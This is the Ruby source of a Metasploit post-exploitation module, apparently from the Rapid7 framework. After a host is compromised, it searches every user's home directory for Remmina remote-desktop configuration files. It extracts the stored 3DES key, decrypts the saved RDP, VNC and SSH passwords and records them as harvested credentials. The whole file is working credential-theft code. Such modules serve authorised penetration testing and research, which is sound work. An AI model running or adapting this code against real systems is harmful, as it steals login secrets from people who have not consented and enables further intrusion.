# encoding: binary
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(update_info(
      info,
      'Name'          => 'UNIX Gather Remmina Credentials',
      'Description'   => %q(
        Post module to obtain credentials saved for RDP and VNC from Remmina's configuration files.
        These are encrypted with 3DES using a 256-bit key generated by Remmina which is (by design)
        stored in (relatively) plain text in a file that must be properly protected.
      ),
      'License'       => MSF_LICENSE,
      'Author'        => ['Jon Hart <jon_hart[at]rapid7.com>'],
      'Platform'      => %w(bsd linux osx unix),
      'SessionTypes'  => %w(shell meterpreter)
    ))
  end

  def run
    creds = extract_all_creds
    creds.uniq!
    if creds.empty?
      vprint_status('No Reminna credentials collected')
    else
      vprint_good("Collected #{creds.size} sets of Remmina credentials")
      cred_table = Rex::Text::Table.new(
        'Header'  => 'Remmina Credentials',
        'Indent'  => 1,
        'Columns' => %w(Host Port Service User Password)
      )

      creds.each do |cred|
        cred_table << cred
        report_credential(cred[3], cred[4])
      end

      print_line(cred_table.to_s)
    end
  end

  def decrypt(secret, data)
    c = OpenSSL::Cipher.new('des3')
    key_data = Base64.decode64(secret)
    # the key is the first 24 bytes of the secret
    c.key = key_data[0, 24]
    # the IV is the last 8 bytes of the secret
    c.iv = key_data[24, 8]
    # passwords less than 16 characters are padded with nulls
    c.padding = 0
    c.decrypt
    p = c.update(Base64.decode64(data))
    p << c.final
    # trim null-padded, < 16 character passwords
    p.gsub(/\x00*$/, '')
  end

  # Extracts all remmina creds found anywhere on the target
  def extract_all_creds
    creds = []
    user_dirs = enum_user_directories
    if user_dirs.empty?
      print_error('No user directories found')
      return
    end

    vprint_status("Searching for Remmina creds in #{user_dirs.size} user directories")
    # walk through each user directory
    enum_user_directories.each do |user_dir|
      remmina_dir = ::File.join(user_dir, '.remmina')
      pref_file = ::File.join(remmina_dir, 'remmina.pref')
      next unless file?(pref_file)

      remmina_prefs = get_settings(pref_file)
      next if remmina_prefs.empty?

      if (secret = remmina_prefs['secret'])
        vprint_status("Extracted secret #{secret} from #{pref_file}")
      else
        print_error("No Remmina secret key found in #{pref_file}")
        next
      end

      # look for any  \d+\.remmina files which contain the creds
      cred_files = dir(remmina_dir).map do |entry|
        ::File.join(remmina_dir, entry) if entry =~ /^\d+\.remmina$/
      end
      cred_files.compact!

      if cred_files.empty?
        vprint_status("No Remmina credential files in #{remmina_dir}")
      else
        creds |= extract_creds(secret, cred_files)
      end
    end

    creds
  end

  def extract_creds(secret, files)
    creds = []
    files.each do |file|
      settings = get_settings(file)
      next if settings.empty?

      # get protocol, host, user
      proto = settings['protocol']
      host = settings['server']
      case proto
      when 'RDP'
        port = 3389
        user = settings['username']
      when 'VNC'
        port = 5900
        domain = settings['domain']
        if domain.blank?
          user = settings['username']
        else
          user = domain + '\\' + settings['username']
        end
      when 'SFTP', 'SSH'
        # XXX: in my testing, the box to save SSH passwords was disabled
        # so this may never work
        user = settings['ssh_username']
        port = 22
      else
        print_error("Unsupported protocol: #{proto}")
        next
      end

      # get the password
      encrypted_password = settings['password']
      password = nil
      unless encrypted_password.blank?
        password = decrypt(secret, encrypted_password)
      end

      if host && user && password
        creds << [ host, port, proto.downcase, user, password ]
      else
        missing = []
        missing << 'host' unless host
        missing << 'user' unless user
        missing << 'password' unless password
        vprint_error("No #{missing.join(',')} in #{file}")
      end
    end

    creds
  end

  # Reads key=value pairs from the specified file, returning them as a Hash of key => value
  def get_settings(file)
    settings = {}
    read_file(file).split("\n").each do |line|
      if /^\s*(?<setting>[^#][^=]+)=(?<value>.*)/ =~ line
        settings[setting] = value
      end
    end

    vprint_error("No settings found in #{file}") if settings.empty?
    settings
  end

  def report_credential(user,  pass)
    credential_data = {
        workspace_id: myworkspace_id,
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: self.refname,
        username: user,
        private_data: pass,
        private_type: :password
    }

    create_credential(credential_data)
  end

end
